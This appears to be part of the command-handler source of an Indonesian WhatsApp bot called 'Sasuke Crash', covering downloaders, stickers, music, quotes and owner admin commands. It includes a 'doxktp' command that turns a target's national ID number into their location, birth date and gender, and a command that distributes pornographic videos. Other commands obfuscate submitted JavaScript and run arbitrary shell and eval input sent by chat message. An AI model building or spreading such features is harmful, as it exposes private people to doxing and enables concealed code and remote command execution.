case "h": {
    if (!isCreator) return Reply("𝗞𝗵𝘂𝘀𝘂𝘀 𝗢𝘄𝗻𝗲𝗿");
    if (!m.isAdmin && !isCreator) return Reply("khusus admin");
    if (!m.quoted && !text) return Reply(example("𝗧𝗲𝘅𝘁/𝗥𝗲𝗽𝗹𝘆 𝗧𝗲𝘅𝘁"));

    var teks = m.quoted ? m.quoted.text : text;
    
    try {
        let groupMetadata = await Joocl.groupMetadata(m.chat);
        let member = groupMetadata?.participants?.map(e => e.id) || [];
        
        if (member.length === 0) return Reply("Tidak ada anggota yang dapat ditandai.");
        
        langgxyz.sendMessage(m.chat, { text: teks, mentions: member });
    } catch (err) {
        console.error(err);
        return Reply("❌ Gagal mengambil data grup.");
    }
}
break;
 case "tt": case "tiktok": {
if (!text) return Reply(example("url"))
if (!text.startsWith("https://")) return Reply(example("url"))
await tiktokDl(q).then(async (result) => {
await langgxyz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: langgxyz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await langgxyz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await langgxyz.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await langgxyz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break              
						 
                 case "pin":
      case "pinterest":
        {
          async function pinterest(query) {
            try {
              const { data } = await axios.get(
                `https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(
                  query
                )}`
              );

              return data.result[
                Math.floor(Math.random() * data.result.length)
              ];
            } catch (err) {
              throw Error(err.message);
            }
          }

          if (!text) return Reply(`Contoh: .sasuke`);
          try {
            let hasil = await pinterest(text);
            if (!hasil) return Reply("Gambar tidak ditemukan.");
            const buttons = [
              {
                buttonId: `${prefix}pin ${command}`,
                buttonText: {
                  displayText: "Next",
                },
                type: 1,
              },
            ];

            await langgxyz.sendMessage(
              m.chat,
              {
                image: { url: hasil },
                caption:
                  "Lanjut mencari gambar yang sama? Klik tombol *Next* dibawah ini",
                footer: `Search By Sasuke Crash`,
                buttons: buttons,
                headerType: 1,
                viewOnce: true,
              },
              { quoted: PayX }
            );
          } catch (err) {
            console.error(err.message);
            Reply("Terjadi kesalahan");
          }
        }
        break;
                case "brat": {
          if (!text) return Reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix+command} halo suki`) 
                                               try {
                                                       await langgxyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                                                               const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
                                                                       const response = await axios.get(url, { responseType: "arraybuffer" });
                                                                               const sticker = new Sticker(response.data, {
                                                                                           pack: "Stiker By",
                                                                                                       author: "Erlangga Official",
                                                                                                                   type: "image/png",
                                                                                                                           });
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await langgxyz.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
                                                                                                                                                       console.error("Error:", err);
                                                                                                                                                               await langgxyz.sendMessage(m.chat, {
                                                                                                                                                                           text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
                                                                                                                                                                                   }, { quoted: m });
                                                                                                                                                                                       }
                                                                                                                                                                                      
                                                                                                                                                                                      }
                                                                                          break 
                                                                                           case "bratvid": {
          if (!text) return m.reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix+command} halo suki`) 
                                               try {
                                                       await langgxyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                                                               const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true`;
                                                                       const response = await axios.get(url, { responseType: "arraybuffer" });
                                                                               const sticker = new Sticker(response.data, {
                                                                                           pack: "Stiker By",
                                                                                                       author: "Erlangga Developer",
                                                                                                                   type: "image/png",
                                                                                                                           });
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await langgxyz.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
                                                                                                                                                       console.error("Error:", err);
                                                                                                                                                               await langgxyz.sendMessage(m.chat, {
                                                                                                                                                                           text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
                                                                                                                                                                                   }, { quoted: m });
                                                                                                                                                                                       }
                                                                                                                                                                                      
                                                                                                                                                                                      }                                                                                   
break
                case 'sticker':
case 's':
case 'stiker': {
    if (!quoted) return Reply(`reply image/video dengan caption ${prefix + command}`);
    try {
        if (/image/.test(mime)) {
            const media = await quoted.download();
            const imageUrl = `data:${mime};base64,${media.toString('base64')}`;
            await makeStickerFromUrl(imageUrl, langgxyz, m);
        } else if (/video/.test(mime)) {
            if ((quoted?.msg || quoted)?.seconds > 10) return m.reply('Durasi video maksimal 10 detik!')
                const media = await quoted.download();
                const videoUrl = `data:${mime};base64,${media.toString('base64')}`;
                await makeStickerFromUrl(videoUrl, langgxyz, m);
            } else {
                return Reply('Kirim gambar/video dengan caption .s (video durasi 1-10 detik)');
            }
        } catch (error) {
            console.error(error);
            return Reply('Terjadi kesalahan saat memproses media. Coba lagi.');
        }
    }
    break;
    case 'bokep':{
if (!isCreator && !isPremium) return Reply(mess.owner)
const caption = `Sange Lu Cill?`;
let heyy
if (/bokep/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ditss-dev/ditss/main/okep')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]

			langgxyz.sendMessage(m.chat,{
			 video: {url:yeha},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `© Erlangga Ned Tobrut`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						},
                       						{
							buttonId: `.menu`, 

							buttonText: {
								displayText: "back menu"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: PayX
				});
			}
			//D|ts si pler 🐎
break         
                
case "motivasi":
case "quotes-motivasi":
case "motivasi-quotes": {
let motivasii = await fetchJson('https://raw.githubusercontent.com/ditss-dev/database/main/quotes/motivasi.json');
let quotesmotivasi = motivasii[Math.floor(Math.random() * motivasii.length)];
langgxyz.sendMessage(m.chat,{
			 image: {url: "https://img12.pixhost.to/images/1502/585103551_erlangga.jpg"},
 //renderLargerThumbnail: true,
					caption: quotesmotivasi,
					footer: `> Erlangga Mode Albert Einstein`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						},
                       						{
							buttonId: `.menu`, 

							buttonText: {
								displayText: "back menu"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: PayX
				});
    await langgxyz.sendMessage(m.chat, {audio: fs.readFileSync('./all/sound/AbsoluteCinema.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
			}
			//D|ts si pler 🐎
break
case 'addcase': {
 if (!isCreator) return Reply('lu sapa asu')
 if (!text) return Reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'langgxyz.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                Reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                Reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        Reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
 case "sendsc": {
  if (!isCreator) return Reply('*Fitur Ini Khusus Bang Erlangga*')
  
  if (!args[0]) return Reply(example("628xxx"));
  
  let targetNumber = args[0]
  if (!targetNumber.startsWith('62')) return m.reply(example("628xxx"))
  
  await Reply("Memproses pengiriman script bot")
  var name = `Sasuke-Crash-Gen6`
  
  const ls = (await execSync("ls"))
    .toString()
    .split("\n")
    .filter(
      (pe) =>
        pe != "node_modules" &&
        pe != "session" &&
        pe != "package-lock.json" &&
        pe != "yarn.lock" &&
        pe != ""
    )
    
  const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
  
  await langgxyz.sendMessage(`${targetNumber}@s.whatsapp.net`, {
    document: await fs.readFileSync(`./${name}.zip`),
    fileName: `${name}.zip`,
    mimetype: "application/zip"
  }, {quoted: m })
  
  await execSync(`rm -rf ${name}.zip`)
  
  return Reply(`*Script bot berhasil dikirim ke nomor*\n *📞 ${targetNumber}*`)
}
break
 case 'owner': {
    langgxyz.sendMessage(m.chat, { react: { text: "👤", key: m.key } });

    let menu = `
*👋 Hi ${pushname} Ini Adalah Owner Sasuke Crash Mohon Jangan Spam!!
    `;

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                            newsletterName: `Channel Erlangga Official`,
                            newsletterJid: "12036341728891399@newsletter",
                            serverMessageId: 143
                        },
                        businessMessageForwardInfo: { businessOwnerJid: langgxyz.decodeJid(langgxyz.user.id) },
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "Erlangga Official"
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"ᴏᴡɴᴇʀ\",\"url\":\"https://wa.me/6282137392620\",\"merchant_url\":\"https://wa.me/6282137392620\"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"Saluran Developer\",\"url\":\"https://whatsapp.com/channel/0029Vb46mdpCHDymFEKsWI2r/989\",\"merchant_url\":\"https://wa.me/6282137392620\"}`
                            }
                        ],
                    })
                })
            }
        }
    }, {});

    await langgxyz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./langgxyz.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
Reply(`${getcase(q)}`)
} catch (e) {
return Reply(`Case *${text}* Tidak Ditemukan`)
}
}
break
      case 'tohd': case "hd": case 'remini': {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await langgxyz.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await langgxyz.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break
case 'play': {
  langgxyz.sendMessage(m.chat, { react: { text: "💬", key: m.key } });
    
    if (!isCreator) return Reply(mess.owner);
    if (args.length === 0) return langgxyz.sendMessage(m.chat, { text: `🎶 Ketikkan nama lagu atau URL YouTube, misalnya:\n${prefix+command} dj kane` }, { quoted: m });
    
    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0) return langgxyz.sendMessage(m.chat, { text: '🔍 Lagu yang Anda cari tidak ditemukan. Silakan coba lagi dengan kata kunci yang lebih tepat.' }, { quoted: m });

        const video = search.all[0];
        const detail = `🎥 *Youtube Audio Play*

* ❖ Judul* : ${video.title}
*❖ Penonton* : ${video.views}
*❖ Pengarang* : ${video.author.name}
*❖ Diunggah* : ${video.ago}
*❖ URL* : ${video.url}

🔄 _Proses pengunduhan audio, harap tunggu..._`;

        await langgxyz.sendMessage(m.chat, { text: detail }, { quoted: PayX });

        const format = 'mp3';
        const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(video.url)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;

        const response = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        if (!response.data || !response.data.success) return langgxyz.sendMessage(m.chat, { text: '❌ Gagal mengunduh audio. Coba lagi nanti.' }, { quoted: PayX });

        const { id, title, info } = response.data;
        const { image } = info;

        while (true) {
            const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });

            if (progress.data && progress.data.success && progress.data.progress === 1000) {
                const downloadUrl = progress.data.download_url;

                await langgxyz.sendMessage(m.chat, {
                    audio: { url: downloadUrl },
                    mimetype: 'audio/mpeg',
                    fileName: `${title}.mp3`
                }, { quoted: PayX });

                await langgxyz.sendMessage(m.chat, {
                    text: `🎧 Audio *${title}* telah berhasil diunduh dan siap untuk dinikmati! 🎶`
                }, { quoted: PayX });
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    } catch (error) {
        console.error('Error:', error);
        langgxyz.sendMessage(m.chat, { text: '⚠️ Terjadi kesalahan saat mencoba mengunduh audio. Mohon coba lagi nanti.' }, { quoted: PayX });
    }
}
break;
                case 'enchard': case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./all/tmp/@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./all/tmp/@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "高宝座ErlanggaDeveloper齐Xyz高宝座高" + 
            "高宝座ErlanggaDeveloper齐Xyz高宝座高";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒSasukeCrash/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./all/tmp/@hardenc${filename}.js`, obfuscated)
  await langgxyz.sendMessage(m.chat, {document: fs.readFileSync(`./all/tmp/@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: PayX})
}).catch(e => Reply("Error :" + e))
await fs.unlinkSync(`./all/tmp/@hardenc${filename}.js`)
}
break
                
      case 'nikktp': case 'doxktp':
    if (!isCreator) return Reply(mess.owner)
    if (!q) return Reply(`Anda harus mendapatkan NIK target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
    
    const { nikParser } = require('nik-parser')
    const ktp = q
    const nik = nikParser(ktp)

    const provinsi = nik.province()
    const kabupaten = nik.kabupatenKota()
    const kecamatan = nik.kecamatan()

    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(kecamatan + ', ' + kabupaten + ', ' + provinsi)}`

    Reply(`Nik: ${nik.isValid()}
Provinsi ID: ${nik.provinceId()}
Nama Provinsi: ${provinsi}
Kabupaten ID: ${nik.kabupatenKotaId()}
Nama Kabupaten: ${kabupaten}
Kecamatan ID: ${nik.kecamatanId()}
Nama Kecamatan: ${kecamatan}
Kode Pos: ${nik.kodepos()}
Jenis Kelamin: ${nik.kelamin()}
Tanggal Lahir: ${nik.lahir()}
Uniqcode: ${nik.uniqcode()}

📍 *Lokasi di Maps:*\n(${mapsUrl})`)

break
                case 'meta-ai': {
  if (!text) return Reply('Send Text / Question');
            try {
                const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(text)}`;
                const response = await fetch(apiUrl);
                const mark = await response.json();

                const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

                await langgxyz.sendMessage(m.chat, { text: ress }, {quoted:m});
                
} catch (error) {
    console.error("Terjadi kesalahan segera hubungi developer!!!:", error.message);
}
}
break

//------- Security
case 'adduser':
case 'adddb':
case 'addno': {
    if (!isCreator) return Reply("*Your Not My Owner*")
    if (!q) return Reply(`Where Is The User Number? Example ${prefix + command} 62×××`)
    let jidx = q.replace(/[^0-9+]/g, "")
    if (jidx.startsWith("+")) jidx = jidx.slice(1)
    if (jidx.startsWith("0")) jidx = "62" + jidx.slice(1)
    if (jidx.length < 10) return Reply("Invalid Number Format!")

    // Input
    global.lastAddedUser = jidx

    addUser(jidx)
    await Reply('Wait, Add Database User Process.')
    await sleep(1000)
    langgxyz.sendMessage(m.chat, {
        image: { url: "https://files.catbox.moe/ggjkbc.jpg" },
        caption: `Successfully Added To Database`,
        footer: "© Erlangga Official",
        buttons: [
            {
                buttonId: ".canceladd",
                buttonText: { displayText: "⬡ Cancel" },
                type: 1
            },
            {
                buttonId: ".listdb",
                buttonText: { displayText: "⬡ Database" },
                type: 1
            },
            {
                buttonId: ".menu",
                buttonText: { displayText: "⬡ Back" },
                type: 1
            }
        ],
        viewOnce: true
    }, { quoted: PayX })
}
break

case 'canceladd': {
    if (!isCreator) return Reply("*Your Not My Onwer*");

    if (!global.lastAddedUser) return Reply("There is no recently added number to remove.");

    delUser(global.lastAddedUser);
    let removedNumber = global.lastAddedUser;
    global.lastAddedUser = null;
    await Reply(`Removed ${removedNumber} From Database.`);
}
break

    case 'deldb':
    case 'deluser':
    case 'delno':
    case 'dellno':
    case 'delldb': {
        if (!isCreator) return Reply("*Your Not My Onwer*")
        if (!q) return Reply(`Where Is The User Number? Example ${prefix + command} 62×××`)
    
        global.lastDeletedUser = q
        try {
        await delUser(q)
        await Reply('Wait For Del User In The Database')
        } catch (err) {
        return Reply(err.message)
        }
        await Reply('Wait For Del User In The Database')
        await sleep(1000)
        langgxyz.sendMessage(m.chat, {
            image: { url: "https://files.catbox.moe/ggjkbc.jpg" },
            caption: `Successfully Delete From Database`,
            footer: "© Erlangga Official",
            buttons: [
                {
                    buttonId: ".canceldelete",
                    buttonText: { displayText: "⬡ Cancel" },
                    type: 1
                },
                {
                buttonId: ".listdb",
                buttonText: { displayText: "⬡ Database" },
                type: 1
                },
                {
                    buttonId: ".menu",
                    buttonText: { displayText: "⬡ Back" },
                    type: 1
                }
            ],
            viewOnce: true
        }, { quoted: PayX })
    }
    break
    
case 'canceldelete': {
    if (!isCreator) return Reply("*Your Not My Onwer*");
    if (!global.lastDeletedUser) return Reply("There is no deleted number to restore.");
    addUser(global.lastDeletedUser);
    let restoredNumber = global.lastDeletedUser;
    global.lastDeletedUser = null; 
    await Reply(`Restored ${restoredNumber} To Database.`);
}
break

    case 'listuser':
    case 'listusr':
    case 'listdb': {
        if (!isCreator) return Reply("*You're Not My Owner*")
    
        const dataListGithub = await listUser()
        if (typeof dataListGithub === 'string' && dataListGithub.startsWith("No Users Found")) {
            return Reply(dataListGithub)
        }
    
        let users = dataListGithub
            .split('\n')
            .slice(2)
            .map(line => {
                let match = line.match(/\*([0-9]+)\*/)
                return match ? { title: `Nomor: ${match[1]}`, id: "#" } : null
            })
            .filter(Boolean)
    
        let buttonMessage = {
            text: "⨭ 𝗢𝗣𝗘𝗥𝗔𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦\n—Detail:",
            footer: "© Erlangga Developer",
            buttons: [
                {
                    buttonId: 'action',
                    buttonText: { displayText: 'User List' },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({
                            title: "𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗨𝘀𝗲𝗿𝘀",
                            sections: [{ title: "List Nomor Yang Ada Di Database:", rows: users }]
                        })
                    },
                    viewOnce: true
                }
            ]
        }
    
        await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break
  
  
   case 'ckey':
   case 'cgkey':
   case 'gantikey':
   case 'changekey': {
    if (!isCreator) return Reply("*Your Not My Owner*")
    if (!q) return Reply("Please Provide The New Key!")
    if (m.isGroup) return Reply("This Command Can Only Be Used In Private Chat!")

    const oldKey = await getCurrentKey()
    await changeKey(q)
    global.previousKey = oldKey

    let teks = `\`[ # ]\` Key Successfully Changed To: *${q}*`

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                interactiveMessage: {
                    body: { text: teks },
                    footer: { text: global.dev },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                "name": "cta_copy",
                                "buttonParamsJson": `{"display_text": "Copy Key","copy_code": "${q}"}`
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: PayX })

    await langgxyz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
    }
    break
    
    case 'cekkey':
    case 'getkey':
    case 'gkey':
    case 'ambilkey':
    case 'checkkey': {
    if (!isCreator) return Reply("*Your Not My Owner*")
    if (m.isGroup) return Reply("This Command Can Only Be Used In Private Chat!")

    const key = await checkKey()
    if (!key) return Reply("Failed To Fetch Key.")

    let teks = `\`[ # ]\` Current Key: *${key}*`

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                interactiveMessage: {
                    body: { text: teks },
                    footer: { text: global.dev },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                "name": "cta_copy",
                                "buttonParamsJson": `{"display_text": "Copy Key","copy_code": "${key}"}`
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: PayX })

    await langgxyz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
}
break
                default:
                if (budy.startsWith('$')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return Reply(err)
                        if (stdout) return Reply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await Reply(evaled);
                    } catch (err) {
                        Reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await Reply(require('util').format(teks))
                    }
                }
        
        }
  } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
